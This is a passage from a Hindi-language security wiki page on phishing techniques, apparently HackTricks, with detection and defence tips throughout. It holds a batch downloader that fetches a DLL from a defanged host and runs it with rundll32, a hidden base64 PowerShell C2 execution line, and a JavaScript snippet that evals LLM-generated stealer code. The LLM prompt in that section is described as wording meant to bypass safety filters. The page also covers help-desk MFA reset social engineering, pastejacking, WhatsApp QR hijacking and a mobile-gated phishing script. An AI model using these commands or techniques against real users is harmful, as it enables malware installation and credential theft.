  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest` payload को `%TEMP%` में डालता है, network jitter को छिपाने के लिए थोड़ी देर sleep करता है, फिर `rundll32` exported entrypoint (`notepad`) को कॉल करता है।
* DLL host identity भेजता है और हर कुछ मिनट में C2 को poll करता है। Remote tasking **base64-encoded PowerShell** के रूप में आता है, जिसे hidden और policy bypass के साथ execute किया जाता है:
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * इससे C2 में लचीलापन बना रहता है (server DLL को अपडेट किए बिना tasks बदल सकता है) और console windows छिपी रहती हैं। `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` का एक साथ उपयोग करने वाले `rundll32.exe` के PowerShell child processes खोजें।
* Defenders DLL load होने के बाद `...page.php?tynor=<COMPUTER>sss<USER>` के रूप में HTTP(S) callbacks और 5-मिनट के polling intervals खोज सकते हैं।

---

## RTB के ज़रिए display-triggered malvertising

किसी sponsored search result के विपरीत, जिसे click करना पड़ता है, RTB ad अपनी creative के website या app में render होने पर third-party JavaScript लोड कर सकता है। Citizen Lab ने advertising identifiers के साथ अलग decision server को कॉल करने वाले ad tags देखे। ज़्यादातर impressions को खाली response मिला; चुनिंदा impressions को JavaScript मिल सकता था। इसलिए replay के दौरान benign response मिलने से यह साबित नहीं होता कि हर viewer को वही content मिला था।<sup>[[14]](#references)</sup>

यह एक **delivery mechanism** है, अपने-आप में exploit नहीं: ad-rendering context में JavaScript चलने से spyware अपने-आप install नहीं होता। मूल browser या OS exploit का खुलासा नहीं किया गया था, इसलिए केवल ad impression या decision-server request संक्रमण का प्रमाण नहीं है। RTB targeting में identifier-linkage के लिए, देखें [Threat Modeling and Identity Separation](../../privacy/threat-modeling-and-identity-separation.md)।<sup>[[14]](#references)</sup>

## AI-Enhanced Phishing Operations
हमलावर अब पूरी तरह व्यक्तिगत lures और real-time interaction के लिए **LLM और voice-clone APIs** को chain करते हैं।

| Layer | Threat actor द्वारा उपयोग का उदाहरण |
|-------|-----------------------------|
|Automation|Randomized wording और tracking links के साथ 100 हज़ार से ज़्यादा emails / SMS generate करके भेजना।|
|Generative AI|सार्वजनिक M&A का उल्लेख करने वाले *एक बार के* emails और social media के अंदरूनी मज़ाक तैयार करना; callback scam में CEO की deep-fake आवाज़ का उपयोग करना।|
|Agentic AI|स्वायत्त रूप से domains register करना, open-source intel scrape करना और victim के click करने पर—लेकिन creds जमा न करने पर—अगले चरण के mails तैयार करना।|

**बचाव:**  
• अविश्वसनीय automation से भेजे गए messages को हाइलाइट करने वाले **dynamic banners** जोड़ें (ARC/DKIM anomalies के ज़रिए)।  
• उच्च-जोखिम वाले phone requests के लिए **voice-biometric challenge phrases** लागू करें।  
• जागरूकता कार्यक्रमों में AI-generated lures का लगातार simulation करें—static templates अब पुराने पड़ चुके हैं।

Credential phishing के लिए agentic browsing abuse भी देखें:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Secrets inventory और detection के लिए local CLI tools और MCP के AI agent abuse को भी देखें:

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Phishing JavaScript का LLM-सहायता से runtime assembly (in-browser codegen)

हमलावर सामान्य दिखने वाला HTML भेजकर **runtime पर stealer generate कर सकते हैं**—इसके लिए **trusted LLM API** से JavaScript माँगकर उसे browser में execute किया जाता है (जैसे, `eval` या dynamic `<script>`)।<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** prompt में exfil URLs/Base64 strings encode करें; safety filters को bypass करने और hallucinations कम करने के लिए wording में बार-बार बदलाव करें।
2. **Client-side API call:** load होने पर JS किसी public LLM (Gemini/DeepSeek आदि) या CDN proxy को call करता है; static HTML में केवल prompt/API call मौजूद होता है।
3. **Assemble & exec:** response को concatenate करके execute करें (हर visit पर polymorphic):

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** generated code lure को personalize करता है (जैसे, LogoKit token parsing) और creds को prompt-hidden endpoint पर भेजता है।

**बचाव से बचने की विशेषताएँ**
- Traffic जाने-माने LLM domains या प्रतिष्ठित CDN proxies तक पहुँचता है; कभी-कभी backend से WebSockets के ज़रिए।
- कोई static payload नहीं; malicious JS केवल render के बाद मौजूद होता है।
- Non-deterministic generations से हर session के लिए **अनोखे** stealers बनते हैं।

**पता लगाने के तरीके**
- JS enabled वाले sandboxes चलाएँ; LLM responses से आए **runtime `eval`/dynamic script creation** को flag करें।
- LLM APIs पर front-end POSTs के तुरंत बाद लौटे हुए text पर `eval`/`Function` चलने की तलाश करें।
- Client traffic में अस्वीकृत LLM domains और उसके बाद होने वाले credential POSTs पर alert करें।

---

## MFA Fatigue / Push Bombing का प्रकार – ज़बरन Reset
क्लासिक push-bombing के अलावा, operators help-desk call के दौरान बस **नया MFA registration ज़बरन करवाते हैं**, जिससे user का मौजूदा token अमान्य हो जाता है। इसके बाद आने वाला कोई भी login prompt पीड़ित को वैध दिखाई देता है।

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

AzureAD/AWS/Okta events पर निगरानी रखें, जहाँ **`deleteMFA` + `addMFA`** कुछ ही मिनटों के भीतर **same IP** से हों।



## Clipboard Hijacking / Pastejacking

हमलावर किसी compromised या typosquatted वेब पेज से चुपचाप victim के clipboard में malicious commands कॉपी कर सकते हैं और फिर user को उन्हें **Win + R**, **Win + X** या terminal window में paste करने के लिए धोखा दे सकते हैं, जिससे बिना किसी download या attachment के arbitrary code execute हो जाता है।


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### QR social engineering के ज़रिए WhatsApp device-linking hijack
* एक lure page (जैसे, नकली ministry/CERT “channel”) WhatsApp Web/Desktop QR दिखाता है और victim को उसे scan करने का निर्देश देता है, जिससे चुपचाप attacker एक **linked device** के रूप में जुड़ जाता है।<sup>[[12]](#references)</sup>
* Attacker को तुरंत chat/contact visibility मिल जाती है, जब तक session हटाया न जाए। Victims को बाद में “new device linked” notification दिख सकता है; defenders उन untrusted QR pages पर जाने के तुरंत बाद होने वाले अप्रत्याशित device-link events की तलाश कर सकते हैं।

### Crawlers/sandboxes से बचने के लिए Mobile‑gated phishing
Operators तेजी से अपने phishing flows को एक साधारण device check के पीछे छिपा रहे हैं, ताकि desktop crawlers अंतिम pages तक न पहुँचें। एक आम तरीका है ऐसा छोटा script जो touch-capable DOM की जाँच करता है और नतीजा server endpoint पर भेजता है; non‑mobile clients को HTTP 500 (या blank page) मिलता है, जबकि mobile users को पूरा flow दिखाया जाता है।<sup>[[7]](#references)</sup>

न्यूनतम client snippet (सामान्य logic):

```html
<script src="/static/detect_device.js"></script>
```

`detect_device.js` का लॉजिक (सरलीकृत):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

अक्सर देखा जाने वाला Server व्यवहार:
- पहले load के दौरान session cookie सेट करता है।
- `POST /detect {"is_mobile":true|false}` स्वीकार करता है।
- `is_mobile=false` होने पर बाद के GET अनुरोधों में 500 (या placeholder) लौटाता है; phishing content केवल `true` होने पर दिखाता है।

Hunting और detection heuristics:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: `GET /static/detect_device.js` → `POST /detect` → non-mobile के लिए HTTP 500 का क्रम; वैध mobile victim paths में 200 और उसके बाद HTML/JS मिलता है।
- उन pages को block करें या उनकी जाँच करें जो content को केवल `ontouchstart` या इसी तरह की device checks के आधार पर दिखाते हैं।

Defence tips:
- gated content सामने लाने के लिए crawlers को mobile-like fingerprints और JS enabled के साथ चलाएँ।
- नए registered domains पर `POST /detect` के बाद आने वाले संदिग्ध 500 responses पर alert करें।

## References

- [1] [Phishing में इस्तेमाल होने वाले Domain Variations बनाना (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Phishing ढूँढ़ना: Tools और Techniques (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [noVNC का इस्तेमाल करके Credentials चुराना और 2FA को Bypass करना (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [EvilnoVNC के साथ Sessions चुराना और 2FA को Bypass करना (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Debian Wheezy पर Postfix के साथ DKIM कैसे Install और Configure करें (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [2025 Unit 42 Global Incident Response Report – Social Engineering संस्करण](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – mobile-gated phishing infrastructure और heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Runtime Assembly Attacks का अगला मोर्चा: Real Time में Phishing JavaScript बनाने के लिए LLMs का उपयोग](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Impersonation, Click Hijacking और TDS: Malware Distribution Ecosystem के अंदरूनी पहलू](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Windows.com पर Bitsquatting (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Bitflipping से Microsoft के windows.com पर आने वाले Traffic को Hijack करना (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [प्यार? दरअसल: Pakistan में Targeted Spyware Campaign के Lure के रूप में इस्तेमाल किया गया Fake Dating App](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoCs और Samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [14] [AdFection का पर्दाफाश: Discover-Tech ने Targeted Ads को Zero-Click Mercenary Spyware की Pipeline में कैसे बदला](https://citizenlab.ca/research/how-discover-tech-turned-targeted-ads-into-a-pipeline-for-spyware/)
{{#include ../../banners/hacktricks-training.md}}
